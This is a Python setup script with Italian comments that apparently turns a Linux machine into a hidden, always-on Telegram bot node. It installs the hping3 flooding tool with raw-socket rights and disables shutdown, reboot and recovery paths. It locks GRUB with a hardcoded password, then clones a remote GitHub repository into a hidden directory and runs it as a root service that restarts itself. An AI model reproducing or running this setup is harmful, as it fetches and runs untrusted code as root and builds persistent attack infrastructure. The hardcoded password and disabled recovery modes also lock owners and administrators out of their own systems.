#!/usr/bin/env python3
import os
import subprocess
import pexpect
import sys

def run(cmd, fatal=False):
    print(f"[+] {cmd}")
    r = subprocess.run(cmd, shell=True)
    if fatal and r.returncode != 0:
        print("[!] ERRORE FATALE")
        sys.exit(1)

# =============================
# REQUIRE ROOT
# =============================
if os.geteuid() != 0:
    print("Devi eseguire questo script come root")
    sys.exit(1)

# =============================
# 1. Install dipendenze
# =============================
run("apt update", fatal=True)
run(
    "apt install -y hping3 git curl build-essential libssl-dev zlib1g-dev "
    "libncurses5-dev libffi-dev libreadline-dev python3-pexpect",
    fatal=True
)

# =============================
# 2. setcap su hping3
# =============================
HPING = "/usr/sbin/hping3"
if os.path.exists(HPING):
    run(f"setcap cap_net_raw+ep {HPING}")

# =============================
# 3. PATH globale
# =============================
with open("/root/.bashrc", "a") as f:
    f.write("\nexport PATH=$PATH:/sbin:/usr/sbin\n")

# =============================
# 4. Disabilita power / reboot / suspend
# =============================
targets = [
    "ctrl-alt-del.target",
    "poweroff.target",
    "reboot.target",
    "suspend.target",
    "hibernate.target"
]

for t in targets:
    run(f"systemctl mask {t}")

logind = "/etc/systemd/logind.conf"
lines = []

if os.path.exists(logind):
    with open(logind, "r") as f:
        lines = f.readlines()

def set_conf(key, value):
    for i, l in enumerate(lines):
        if l.strip().startswith(key):
            lines[i] = f"{key}={value}\n"
            return
    lines.append(f"{key}={value}\n")

set_conf("HandleRebootKey", "ignore")
set_conf("HandlePowerKey", "ignore")
set_conf("HandleSuspendKey", "ignore")
set_conf("KillUserProcesses", "no")

with open(logind, "w") as f:
    f.writelines(lines)

run("systemctl daemon-reexec")
run("systemctl restart systemd-logind")

# =============================
# 4.5 LOCK EMERGENCY / RECOVERY
# =============================
systemd_conf = "/etc/systemd/system.conf"
with open(systemd_conf, "a") as f:
    f.write("\n[Manager]\nDefaultEnvironment=SYSTEMD_SULOGIN_FORCE=1\n")

run("systemctl daemon-reexec")

# =============================
# 4.6 LOCK GRUB (100% AUTOMATICO – STABILE)
# =============================
GRUB_PASSWORD = "kali55757"
grub_custom = "/etc/grub.d/40_custom"

print("[+] Generazione hash GRUB automatica")

child = pexpect.spawn("grub-mkpasswd-pbkdf2", encoding="utf-8", timeout=30)

# match robusto (qualsiasi lingua)
child.expect(r"[Pp]assword")
child.sendline(GRUB_PASSWORD)

child.expect(r"[Rr]etype|[Rr]ipeti|[Aa]gain")
child.sendline(GRUB_PASSWORD)

child.expect(pexpect.EOF)
output = child.before

hash_value = None
for line in output.splitlines():
    if "grub.pbkdf2" in line:
        hash_value = line.split()[-1]
        break

if not hash_value:
    print("ERRORE: hash GRUB non trovato")
    print(output)
    sys.exit(1)

grub_content = f"""set superusers="root"
password_pbkdf2 root {hash_value}
"""

# scrittura SICURA (no problemi permessi)
run(f'echo "{grub_content}" | tee {grub_custom} > /dev/null', fatal=True)

run("update-grub", fatal=True)

# =============================
# 5. Install Python 3.10
# =============================
run("cd /usr/src && curl -O https://www.python.org/ftp/python/3.10.14/Python-3.10.14.tgz", fatal=True)
run("cd /usr/src && tar xzf Python-3.10.14.tgz", fatal=True)
run("cd /usr/src/Python-3.10.14 && ./configure --enable-optimizations", fatal=True)
run("cd /usr/src/Python-3.10.14 && make -j$(nproc)", fatal=True)
run("cd /usr/src/Python-3.10.14 && make altinstall", fatal=True)

# =============================
# 6. pip + telegram bot
# =============================
run("/usr/local/bin/python3.10 -m ensurepip", fatal=True)
run("/usr/local/bin/python3.10 -m pip install --upgrade pip", fatal=True)
run("/usr/local/bin/python3.10 -m pip install python-telegram-bot==13.15", fatal=True)

# =============================
# 7. Clone bot
# =============================
run("cd /root && git clone https://github.com/troiarcazzoguardi-dev/bott.git")

if os.path.exists("/root/bott"):
    run("mv /root/bott /root/.bott")
    run("chmod 711 /root/.bott")

# =============================
# 8. SYSTEMD SERVICE
# =============================
service_file = "/etc/systemd/system/bott.service"
with open(service_file, "w") as f:
    f.write("""[Unit]
Description=Telegram Bot Service
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root/.bott
ExecStart=/usr/local/bin/python3.10 /root/.bott/bott.py
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
""")

run("systemctl daemon-reload")
run("systemctl enable bott.service")
run("systemctl start bott.service")

print("\n[✓] SISTEMA LOCKATO – GRUB PROTETTO – BOT ATTIVO")
